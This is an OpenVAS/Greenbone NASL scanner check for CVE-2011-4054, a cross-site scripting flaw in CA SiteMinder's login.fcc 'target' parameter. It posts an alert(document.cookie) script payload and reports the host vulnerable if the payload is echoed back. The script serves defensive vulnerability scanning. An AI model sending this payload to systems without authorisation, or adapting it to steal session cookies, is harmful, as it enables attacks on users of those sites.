if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902800" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_cve_id( "CVE-2011-4054" );
	script_bugtraq_id( 50962 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-12-19 16:16:16 +0530 (Mon, 19 Dec 2011)" );
	script_name( "CA SiteMinder 'target' Parameter Cross-Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47167" );
	script_xref( name: "URL", value: "http://securitytracker.com/id/1026394" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/713012" );
	script_xref( name: "URL", value: "https://support.ca.com/irj/portal/anonymous/phpsupcontent?contentID={A7DA8AC2-E9B4-4DDE-B828-098E0955A344}" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "CA SiteMinder R6 SP6 CR7 and earlier
  CA SiteMinder R12 SP3 CR8 and earlier" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input passed
  to the 'target' POST parameter in login.fcc (when 'postpreservationdata' is
  set to 'fail'), which allows attackers to execute arbitrary HTML and script
  code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution", value: "Upgrade to CA SiteMinder R6 SP6 CR8, R12 SP3 CR9 or later." );
	script_tag( name: "summary", value: "This host is running CA SiteMinder and is prone to cross-site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/siteminderagent", "/siteminder", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/forms/login.fcc";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "<title>SiteMinder" )){
		postData = "postpreservationdata=fail&target=\"><script>alert(document." + "cookie)</script><\"";
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "><script>alert(document.cookie)</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

